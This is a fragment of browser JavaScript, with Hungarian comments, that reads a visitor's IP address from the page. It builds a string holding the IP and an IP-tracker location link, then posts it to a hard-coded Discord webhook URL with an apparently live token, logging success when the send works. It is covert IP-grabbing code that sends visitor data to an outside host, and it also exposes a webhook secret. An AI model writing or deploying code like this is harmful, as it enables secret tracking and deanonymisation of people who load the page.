...
document.getElementById('log').value = IpResult;
...
debug += 'ip.addres = ' + '||' + document.getElementById('log').value + '||' + '\n';
debug += 'ip.location = ' + '||' + 'https://www.opentracker.net/feature/ip-tracker?ip=' + document.getElementById('log').value + '||'

const webhookURL = 'https://discord.com/api/webhooks/1180245353887432925/njZXztSMSiPNsyokoT9hDJhacrM0vataEQt-whFwZ6vz0oZwURDF7ikH7NqBcy6gtWx3';

sendMessage(webhookURL, debug);
...
.then(response => {
    if (response.ok) {
        console.log('Üzenet sikeresen elküldve a webhookra!');
    } 
})
